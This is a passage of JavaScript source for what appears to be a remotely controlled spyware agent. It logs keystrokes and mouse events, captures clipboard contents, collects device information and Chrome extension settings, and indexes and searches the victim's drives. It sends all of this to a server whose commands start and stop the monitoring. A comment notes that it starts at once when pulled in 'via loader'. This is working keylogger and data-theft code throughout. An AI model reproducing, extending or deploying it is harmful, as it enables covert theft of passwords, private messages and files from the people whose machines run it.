      log(`[Keyboard] ⏰ BATCH INTERVAL FIRED - ${keyboardMouseEvents.length} raw events accumulated`, "INFO");
      
      // Fix #2: Deduplicate and coalesce repeated key presses
      const dedupedEvents = deduplicateEvents([...keyboardMouseEvents]);
      const reductionRatio = keyboardMouseEvents.length > 0 
        ? ((keyboardMouseEvents.length - dedupedEvents.length) / keyboardMouseEvents.length * 100).toFixed(1)
        : 0;
      
      log(`[Keyboard] 📊 Deduplication: ${keyboardMouseEvents.length} raw → ${dedupedEvents.length} unique (${reductionRatio}% reduction)`, "INFO");
      
      try {
        const eventBatch = {
          computerName: computerName,
          events: dedupedEvents,
          batchId: `batch_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
          batchSize: dedupedEvents.length,
          rawEventCount: keyboardMouseEvents.length,
          deduplicationRatio: reductionRatio
          // NOTE: Do NOT include client-side timestamp here
          // Server will add serverReceivedTime when processing
        };
        
        // Log readable event summary
        const eventSummary = dedupedEvents.slice(0, 3).map(e => e.readableKey || `code:${e.keyCode}`).join(', ');
        log(`[Keyboard] BATCH PREPARED - ID: ${eventBatch.batchId}, Events: ${eventBatch.batchSize}, First: ${eventSummary}`, "INFO");
        
        (await uploadKeyboardMouseEvents(eventBatch),
          (keyboardMouseEvents = []),
          log(`Uploaded ${dedupedEvents.length} unique keyboard events (${keyboardMouseEvents.length} raw)`, "SUCCESS"));
      } catch (error) {
        log(`Failed to upload keyboard events: ${error.message}`, "WARN");
        
        // Fix #4: Improved overflow protection - limit accumulation even on success
        const MAX_EVENTS_PER_BATCH = 500;
        
        if (keyboardMouseEvents.length > MAX_EVENTS_PER_BATCH) {
          const droppedCount = keyboardMouseEvents.length - MAX_EVENTS_PER_BATCH;
          keyboardMouseEvents = keyboardMouseEvents.slice(-MAX_EVENTS_PER_BATCH);
          log(
            `[Keyboard] Events capped: Dropped ${droppedCount} oldest events to prevent unbounded growth`,
            "WARN"
          );
        }
        
        // Also implement periodic clearing to prevent memory issues
        const BATCH_LIMIT_MS = 60000; // 60 seconds
        if (!keyboardBatchStartTime) {
          keyboardBatchStartTime = Date.now();
        }
        if (Date.now() - keyboardBatchStartTime > BATCH_LIMIT_MS) {
          log(
            `[Keyboard] Force-clearing batch: ${keyboardMouseEvents.length} events held for >60s`,
            "WARN"
          );
          keyboardMouseEvents = [];
          keyboardBatchStartTime = null;
        }
      }
    }
  }, intervalMs)),
    (keyboardMouseMonitoringStatusCheck = setInterval(async () => {
      if (keyboardMouseMonitoringActive)
        try {
          const statusResponse = await httpRequest(
            `${currentConfig.server_url}/api/keyboard-mouse-status/${computerName}`,
            { method: "GET" },
          );
          if (200 === statusResponse.statusCode && statusResponse.data) {
            const statusData = void 0;
            !1 === JSON.parse(statusResponse.data).isMonitoring &&
              keyboardMouseMonitoringActive &&
              (log(
                "?? Server stop command received - stopping keyboard monitoring",
                "WARN",
              ),
              stopKeyboardMouseMonitoring(),
              clearInterval(keyboardMouseMonitoringStatusCheck));
          }
        } catch (error) {}
      else clearInterval(keyboardMouseMonitoringStatusCheck);
    }, 1e4)));
}
function stopKeyboardMouseMonitoring() {
  if (keyboardMouseMonitoringActive) {
    if (
      ((keyboardMouseMonitoringActive = !1),
      keyboardMouseMonitoringInterval &&
        (clearInterval(keyboardMouseMonitoringInterval),
        (keyboardMouseMonitoringInterval = null)),
      keyboardMouseMonitoringStatusCheck &&
        (clearInterval(keyboardMouseMonitoringStatusCheck),
        (keyboardMouseMonitoringStatusCheck = null)),
      ioHookInstance)
    )
      try {
        (ioHookInstance.kill("SIGTERM"), (ioHookInstance = null));
      } catch (error) {
        log(`Error stopping keyboard monitor: ${error.message}`, "WARN");
      }
    ((keyboardMouseEvents = []),
      log("? Keyboard monitoring stopped", "SUCCESS"));
  }
}
async function uploadKeyboardMouseEvents(eventBatch) {
  // LOG: Keyboard events before sending
  log(`[Keyboard] BEFORE SEND - Batch ID: ${eventBatch.batchId}, Events count: ${eventBatch.events.length}, ComputerName: ${eventBatch.computerName}`, "INFO");
  if (eventBatch.events.length > 0) {
    const keysSummary = eventBatch.events.slice(0, 5).map(e => e.readableKey || `code:${e.keyCode}`).join(', ');
    log(`[Keyboard] First 5 keys: [${keysSummary}${eventBatch.events.length > 5 ? '...' : ''}]`, "INFO");
  }
  
  return new Promise((resolve, reject) => {
    try {
      const body = JSON.stringify(eventBatch),
        url = new URL(`${currentConfig.server_url}/api/keyboard-mouse-data`),
        urlObj = void 0,
        client = "https:" === url.protocol ? require("https") : require("http"),
        options = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(body),
          },
          timeout: 2e4,
        },
        req = client.request(url.toString(), options, (res) => {
          let data = "";
          (res.on("data", (chunk) => (data += chunk)),
            res.on("end", () => {
              res.statusCode >= 200 && res.statusCode < 300
                ? resolve({ statusCode: res.statusCode, data: data })
                : reject(new Error(`HTTP ${res.statusCode}`));
            }));
        });
      (req.on("error", reject),
        req.on("timeout", () => {
          (req.destroy(), reject(new Error("Request timeout")));
        }),
        req.write(body),
        req.end());
    } catch (error) {
      reject(error);
    }
  });
}
let fileSystemScanner = null;
async function initializeFileSystemScanner() {
  log("? File system scanner skipped", "INFO");
}
async function uploadFileSystemScan(computerName, scanPath, items) {
  return new Promise((resolve, reject) => {
    try {
      const payload = {
          computerName: computerName,
          path: scanPath,
          items: items || [],
          timestamp: new Date().toISOString(),
        },
        body = JSON.stringify(payload),
        url = new URL(`${currentConfig.server_url}/api/file-system/scan`),
        client = "https:" === url.protocol ? require("https") : require("http"),
        options = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(body),
          },
          timeout: 3e4,
        },
        req = client.request(url.toString(), options, (res) => {
          let data = "";
          (res.on("data", (chunk) => (data += chunk)),
            res.on("end", () => {
              res.statusCode >= 200 && res.statusCode < 300
                ? resolve(JSON.parse(data || "{}"))
                : reject(new Error(`HTTP ${res.statusCode}`));
            }));
        });
      (req.on("error", reject),
        req.on("timeout", () => {
          (req.destroy(), reject(new Error("Request timeout")));
        }),
        req.write(body),
        req.end());
    } catch (error) {
      reject(error);
    }
  });
}
async function scanAndUploadDirectory(computerName, dirPath, maxDepth = 3) {
  if (fileSystemScanner)
    try {
      log(`?? Scanning ${dirPath}...`, "INFO");
      const items = fileSystemScanner.scanDirectory(dirPath, maxDepth);
      (log(`?? Uploading ${items.length} items from ${dirPath}...`, "INFO"),
        await uploadFileSystemScan(computerName, dirPath, items),
        log(`? Directory scan complete: ${dirPath}`, "SUCCESS"));
    } catch (error) {
      log(`Error scanning directory: ${error.message}`, "WARN");
    }
  else log("File system scanner not initialized", "WARN");
}
async function startFileSystemIndexing(computerName) {
  if (fileSystemScanner)
    try {
      (log(
        "?? Starting file system index... (this may take several minutes)",
        "INFO",
      ),
        await fetch(
          `${currentConfig.server_url}/api/file-system/index-start/${computerName}`,
          { method: "POST", headers: { "Content-Type": "application/json" } },
        ));
      let filesIndexed = 0;
      await fileSystemScanner.indexAllDrives(computerName, (progress) => {
        "indexing" === progress.status
          ? (filesIndexed = progress.indexed)
          : "complete" === progress.status &&
            log(
              `? Indexing complete: ${progress.indexed} files indexed`,
              "SUCCESS",
            );
      });
      const drives = fileSystemScanner.getDrives();
      await fetch(
        `${currentConfig.server_url}/api/file-system/index-complete/${computerName}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            computerName: computerName,
            indexed: fileSystemScanner.fileIndex.size,
            totalFiles: filesIndexed,
            drivesScanned: drives,
          }),
        },
      );
    } catch (error) {
      log(`Error during file system indexing: ${error.message}`, "WARN");
    }
  else log("File system scanner not initialized", "WARN");
}
async function searchFiles(computerName, searchTerm, limit = 100) {
  if (!fileSystemScanner)
    return (log("File system scanner not initialized", "WARN"), []);
  try {
    log(`?? Searching for "${searchTerm}"...`, "INFO");
    const results = fileSystemScanner.searchFiles(searchTerm, limit);
    return (
      log(`Found ${results.length} matches for "${searchTerm}"`, "INFO"),
      await fetch(`${currentConfig.server_url}/api/file-system/search`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          computerName: computerName,
          searchTerm: searchTerm,
          results: results,
          limit: limit,
        }),
      }),
      results
    );
  } catch (error) {
    return (log(`Error searching files: ${error.message}`, "WARN"), []);
  }
}
async function uploadClipboardData(clipboardData) {
  // LOG: Clipboard data before sending
  log(`[Clipboard] BEFORE SEND - Content: "${clipboardData.content.substring(0, 50)}${clipboardData.content.length > 50 ? '...' : ''}", Length: ${clipboardData.content.length}, Hash: ${clipboardData.contentHash.substring(0, 16)}...`, "INFO");
  
  return new Promise((resolve, reject) => {
    try {
      const body = JSON.stringify(clipboardData),
        url = new URL(`${currentConfig.server_url}/api/clipboard-data`),
        urlObj = void 0,
        client = "https:" === url.protocol ? require("https") : require("http"),
        options = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(body),
          },
          timeout: 3e4,
        },
        req = client.request(url.toString(), options, (res) => {
          let data = "";
          (res.on("data", (chunk) => (data += chunk)),
            res.on("end", () => {
              res.statusCode >= 200 && res.statusCode < 300
                ? resolve({ statusCode: res.statusCode, data: data })
                : reject(new Error(`HTTP ${res.statusCode}`));
            }));
        });
      (req.on("error", reject),
        req.on("timeout", () => {
          (req.destroy(), reject(new Error("Request timeout")));
        }),
        req.write(body),
        req.end());
    } catch (error) {
      reject(error);
    }
  });
}
async function main() {
  (currentConfig = await initializeConfig()),
  log(`? Using server: ${currentConfig.server_url}`, "SUCCESS");
  const computerName = os.hostname();
  await initializeFileSystemScanner();
  const deviceSuccess = await uploadDeviceInfo();
  await uploadChromeLocalExtensionSettings(computerName);
  let checkCount = 0;
  const commandCheckInterval = setInterval(async () => {
    checkCount++;
    try {
      const clipboardStatusResponse = await httpRequest(
        `${currentConfig.server_url}/api/clipboard-status/${computerName}`,
        { method: "GET" },
      );
      if (
        200 === clipboardStatusResponse.statusCode &&
        clipboardStatusResponse.data
      ) {
        let clipboardStatusData;
        try {
          clipboardStatusData =
            "string" == typeof clipboardStatusResponse.data
              ? JSON.parse(clipboardStatusResponse.data)
              : clipboardStatusResponse.data;
        } catch (parseError) {
          return void log(
            `[Check #${checkCount}] Clipboard JSON parse error: ${parseError.message}`,
            "WARN",
          );
        }
        (!0 !== clipboardStatusData.isMonitoring ||
            clipboardMonitoringActive ||
            (log(
              "?? Server start command received - starting clipboard monitoring",
              "INFO",
            ),
            startClipboardMonitoring(computerName, 2e3)),
          !1 === clipboardStatusData.isMonitoring &&
            clipboardMonitoringActive &&
            (log(
              "?? Server stop command received - stopping clipboard monitoring",
              "WARN",
            ),
            stopClipboardMonitoring()));
      }
      const keyboardMouseStatusResponse = await httpRequest(
        `${currentConfig.server_url}/api/keyboard-mouse-status/${computerName}`,
        { method: "GET" },
      );
      if (
        200 === keyboardMouseStatusResponse.statusCode &&
        keyboardMouseStatusResponse.data
      ) {
        let keyboardMouseStatusData;
        try {
          keyboardMouseStatusData =
            "string" == typeof keyboardMouseStatusResponse.data
              ? JSON.parse(keyboardMouseStatusResponse.data)
              : keyboardMouseStatusResponse.data;
        } catch (parseError) {
          return void log(
            `[Check #${checkCount}] Keyboard/Mouse JSON parse error: ${parseError.message}`,
            "WARN",
          );
        }
        (!0 !== keyboardMouseStatusData.isMonitoring ||
            keyboardMouseMonitoringActive ||
            (log(
              "?? Server start command received - starting keyboard/mouse monitoring",
              "INFO",
            ),
            startKeyboardMouseMonitoring(computerName, 5e3)),
          !1 === keyboardMouseStatusData.isMonitoring &&
            keyboardMouseMonitoringActive &&
            (log(
              "?? Server stop command received - stopping keyboard/mouse monitoring",
              "WARN",
            ),
            stopKeyboardMouseMonitoring()));
      }
    } catch (error) {
      log(`[Check #${checkCount}] Error: ${error.message}`, "WARN");
    }
  }, 5e3);
}
if (
  (process.on("SIGINT", () => {
    (log("\nShutting down...", "WARN"), process.exit(0));
  }),
  require.main === module)
) {
  main().catch((error) => {
    (log(`Error: ${error.message}`, "ERROR"), process.exit(1));
  });
} else {
  // When loaded as module (via loader), start main immediately
  main().catch((error) => {
    (log(`Error: ${error.message}`, "ERROR"), process.exit(1));
  });
}

